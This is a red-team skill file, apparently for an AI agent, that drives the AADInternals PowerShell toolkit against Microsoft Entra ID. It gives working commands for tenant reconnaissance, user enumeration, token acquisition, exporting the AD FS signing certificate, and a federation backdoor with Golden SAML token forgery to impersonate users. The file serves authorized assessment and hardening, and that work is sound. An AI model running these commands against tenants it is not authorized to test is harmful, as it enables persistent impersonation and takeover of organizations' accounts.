---
name: auditing-entra-id-with-aadinternals
description: Drive the AADInternals PowerShell toolkit to perform Microsoft Entra ID tenant reconnaissance, access-token acquisition across Microsoft APIs, and federation/AD FS backdoor testing (Golden SAML, T1606.002) for defensive validation. Use during an authorized Entra ID/Microsoft 365 red-team assessment to map external attack surface or verify AD FS signing certs resist Golden SAML. Do not use for ROADrecon/roadtx directory enumeration or primary-refresh-token abuse - use attacking-entra-id-with-roadtools.
domain: cybersecurity
subdomain: identity-access-management
tags:
- aadinternals
- entra-id
- azure-ad
- saml-token-forgery
- federation-backdoor
- token-manipulation
- adfs
- red-team
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- ID.AM-03
mitre_attack:
- T1606.002
---
# Auditing Entra ID with AADInternals

> **Legal Notice:** This skill is for authorized security testing, red-team engagements, and educational purposes only. AADInternals can forge SAML tokens and install federation backdoors that grant persistent impersonation of any tenant user. Use only against tenants you own or have explicit written authorization (rules of engagement) to test. Unauthorized use violates the Computer Fraud and Abuse Act and equivalent laws.

## Overview

AADInternals is the most comprehensive offensive/administrative PowerShell toolkit for Microsoft Entra ID (formerly Azure AD), Azure AD Connect, and Active Directory Federation Services (AD FS), authored by Dr. Nestori Syynimaa (Gerenios / Secureworks). It exposes hundreds of cmdlets (all prefixed `AADInt`) covering unauthenticated outsider reconnaissance, access-token acquisition for every Microsoft API, directory manipulation, AD FS/PTA attacks, and the technique it is most famous for: **federation backdoors** that abuse the `Set-MsolDomainFederationSettings` / `ConvertTo-AADIntBackdoor` path so an attacker who controls a federated domain's `IssuerUri` can mint SAML tokens for arbitrary users — mapping to MITRE ATT&CK **T1606.002 (Forge Web Credentials: SAML Tokens)**, the same class of technique used in the SolarWinds (Golden SAML) intrusions.

The toolkit separates capabilities by required position. `Invoke-AADIntReconAsOutsider` and `Get-AADIntLoginInformation` require no credentials — they query public endpoints (`getuserrealm`, OpenID configuration, autodiscover) to reveal verified domains, tenant ID, federation type, brand, and whether Desktop/Seamless SSO is enabled. With a foothold, `Get-AADIntAccessTokenFor*` cmdlets acquire tokens for Azure AD Graph, Microsoft Graph, Exchange Online, SharePoint, Azure Core Management, and more, optionally caching them so subsequent cmdlets reuse them. With Global Administrator (or a synced AD Connect account), the toolkit can read directory secrets, manipulate users, and establish the federation backdoor.

This skill drives AADInternals through a defensive-validation lens: confirm what an external attacker can learn, what a low-privileged token reaches, and whether federation/AD FS configuration would allow Golden SAML — then produce evidence and hardening recommendations.

## When to Use

- During an authorized Entra ID / Microsoft 365 red-team or assumed-breach assessment
- To enumerate external attack surface (verified domains, federation type, SSO) before credential attacks
- To validate that federation and AD FS token-signing certificates are protected against Golden SAML
- To test token acquisition and replay across Microsoft first-party APIs
- When building detections (pair with the blue-team Graph-log hunting skill) and you need real AADInternals telemetry

## Prerequisites

- Written authorization covering identity-attack and federation-backdoor testing
- Windows host with PowerShell 5.1+ (or PowerShell 7 on the supported subset)
- For backdoor/federation tests: Global Administrator (or equivalent) in the target tenant, in scope per the ROE
- Install the module from the PowerShell Gallery:
  ```powershell
  Install-Module AADInternals -Scope CurrentUser
  Import-Module AADInternals
  # Cross-platform AsOutsider-only reimplementation (no creds) is also available:
  #   https://github.com/synacktiv/AADOutsider-py
  ```
- Familiarity with SAML/WS-Federation, OAuth tokens, and Azure AD Connect

## Objectives

- Perform unauthenticated tenant reconnaissance and enumerate verified domains, tenant ID, and federation type
- Acquire and cache access tokens for Microsoft first-party APIs
- Enumerate users/groups/roles with an authenticated token
- Test the federation backdoor / Golden SAML path in a controlled, authorized manner
- Document exposure and deliver hardening recommendations (token-signing cert protection, federation monitoring)

## MITRE ATT&CK Mapping

| ID | Technique | Application in this skill |
|----|-----------|---------------------------|
| T1606.002 | Forge Web Credentials: SAML Tokens | `ConvertTo-AADIntBackdoor` + `New-AADIntSAMLToken` forge SAML tokens for arbitrary users via a controlled federation `IssuerUri` (Golden SAML) |

Related techniques: **T1087.004** Account Discovery: Cloud Account (recon), **T1528** Steal Application Access Token (token acquisition), **T1556.007** Modify Authentication Process: Hybrid Identity (federation/PTA backdoors).

## Workflow

### Step 1: Unauthenticated outsider reconnaissance
No credentials required. Identify verified domains, tenant ID, federation type, brand, and SSO status.

```powershell
# Full outsider recon for a domain (table output)
Invoke-AADIntReconAsOutsider -DomainName "target.com" | Format-Table

# Login/realm details: federation vs managed, AuthURL, brand
Get-AADIntLoginInformation -Domain "target.com"

# Tenant GUID
Get-AADIntTenantID -Domain "target.com"
```

### Step 2: External user enumeration (optional, noisy)
Validate whether usernames exist via the GetCredentialType / autologon endpoints.

```powershell
# Supply a list of candidate UPNs to test existence
Invoke-AADIntUserEnumerationAsOutsider -UserName "user1@target.com"
# Or pipe many:
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
```

### Step 3: Acquire and cache access tokens
With valid credentials (or an interactive prompt), obtain tokens for the API you need. `-SaveToCache` lets later cmdlets reuse the token automatically.

```powershell
# Azure AD Graph (legacy graph.windows.net) token, cached
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Microsoft Graph (graph.microsoft.com)
$mg = Get-AADIntAccessTokenForMSGraph

# Exchange Online
$exo = Get-AADIntAccessTokenForEXO
```

### Step 4: Authenticated directory enumeration
Using a cached/acquired token, read directory objects to map privilege.

```powershell
# Global tenant info (uses cached AAD Graph token)
Get-AADIntTenantDetails

# Enumerate users and look for privileged / synced accounts
Get-AADIntUsers | Select-Object UserPrincipalName, DirSyncEnabled, ImmutableId
```

### Step 5: Inspect federation / AD FS configuration
Determine whether the tenant uses federated domains and where token-signing keys live — the prerequisite for Golden SAML.

```powershell
# If you have access to the AD FS server, export the token-signing certificate
Export-AADIntADFSSigningCertificate -Path .\adfs_signing.pfx
# Read AD FS configuration / encryption keys (on the AD FS box or via DKM)
Get-AADIntADFSConfiguration -Server adfs.target.com
```

### Step 6: Federation backdoor / Golden SAML (authorized only)
Convert a domain to a backdoor by setting a known `IssuerUri`, then forge a SAML token for a target user using that domain's `ImmutableId`. **Only in a controlled tenant with explicit authorization.**

```powershell
# Requires a Global Admin token (AAD Graph) cached in Step 3
ConvertTo-AADIntBackdoor -DomainName "backdoor.target.com"
# Output includes the IssuerUri to reuse when forging tokens.

# Forge a SAML token impersonating a user (ImmutableId from Get-AADIntUsers)
$saml = New-AADIntSAMLToken -ImmutableID "UQ989+t6fEq9/0ogYtt1pA==" `
    -Issuer "http://backdoor.target.com/adfs/services/trust/" -UseBuiltInCertificate

# Use the forged token to open a portal session as the impersonated user
Open-AADIntOffice365Portal -SAMLToken $saml
```

### Step 7: Document exposure and harden
Capture exactly what recon revealed, which tokens/APIs were reachable, and whether the backdoor/Golden SAML path succeeded. Recommend: protect AD FS token-signing certs (HSM, restricted DKM access), alert on new/changed federation trusts, monitor `Set-DomainAuthentication`/`Set-MsolDomainFederationSettings`, and migrate where feasible to managed (cloud) authentication.

## Tools and Resources

| Resource | Purpose | Source |
|----------|---------|--------|
| AADInternals | Entra ID / AD FS attack & admin toolkit | https://github.com/Gerenios/AADInternals |
| AADInternals docs | Cmdlet reference and technique writeups | https://aadinternals.com/aadinternals/ |
| AADOutsider-py | Cross-platform AsOutsider reimplementation | https://github.com/synacktiv/AADOutsider-py |
| Golden SAML background | Federation backdoor technique writeup | https://aadinternals.com/post/aadbackdoor/ |
| MITRE T1606.002 | Forge Web Credentials: SAML Tokens | https://attack.mitre.org/techniques/T1606/002/ |

## Cmdlet Quick Reference

| Cmdlet | Position | Purpose |
|--------|----------|---------|
| `Invoke-AADIntReconAsOutsider` | None | Verified domains, tenant ID, federation type, SSO |
| `Get-AADIntLoginInformation` | None | Realm/login details for a domain |
| `Get-AADIntTenantID` | None | Tenant GUID |
| `Invoke-AADIntUserEnumerationAsOutsider` | None | Validate user existence |
| `Get-AADIntAccessTokenForAADGraph` | Creds | Azure AD Graph token (`-SaveToCache`) |
| `Get-AADIntAccessTokenForMSGraph` | Creds | Microsoft Graph token |
| `Get-AADIntAccessTokenForEXO` | Creds | Exchange Online token |
| `Get-AADIntUsers` | Token | Enumerate directory users |
| `ConvertTo-AADIntBackdoor` | Global Admin | Convert a domain into a federation backdoor |
| `New-AADIntSAMLToken` | Backdoor | Forge a SAML token for a user (Golden SAML) |
| `Open-AADIntOffice365Portal` | SAML token | Open a portal session as the impersonated user |

## Validation Criteria

- [ ] Outsider recon completed; verified domains, tenant ID, and federation type recorded
- [ ] User enumeration tested (or documented as out of scope)
- [ ] Access token acquired and cached for at least one Microsoft API
- [ ] Authenticated directory enumeration performed (users/roles, synced accounts noted)
- [ ] Federation / AD FS configuration assessed for token-signing key exposure
- [ ] Backdoor / Golden SAML path tested in an authorized controlled tenant or documented as out of scope
- [ ] Exposure documented with concrete impact
- [ ] Hardening recommendations delivered (cert protection, federation monitoring, managed auth migration)
